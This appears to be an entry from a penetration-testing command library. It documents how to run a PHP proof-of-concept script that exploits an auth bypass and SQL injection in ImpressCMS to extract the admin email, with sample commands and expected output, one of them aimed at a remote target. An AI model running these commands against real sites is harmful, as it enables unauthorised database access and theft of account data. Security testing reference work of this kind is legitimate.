---
data: 'php sqli.php http://localhost/impresscms/'
tags:
  - sqli
  - poc
type: command
output: |-
  [-] Retrieving security token...
  [-] Starting SQL Injection attack...
  [-] Admin's email: admin@test.com
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.587Z'
id: 5010cbd0-5e8a-4c64-80aa-fec3ddfa0553
verified: false
validated: true
submitted: true
---
# php-sqli-poc

## Command

```bash
php sqli.php http://localhost/impresscms/
```

## Description

Executes a custom PHP PoC script to exploit auth bypass and SQLi in ImpressCMS, retrieving token and performing injection to extract data like admin email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target ImpressCMS installation URL | Yes |

## Examples

### Basic Usage

```bash
php sqli.php http://localhost/impresscms/
```

### Advanced Usage

```bash
php sqli.php http://target.com/impresscms/ --blind --extract-email
```

## Expected Output

[-] Retrieving security token...
[-] Starting SQL Injection attack...
[-] Admin's email: admin@test.com

## Related

- [[procedures/Exploit-SQL-Injection-in-findusers-php]]
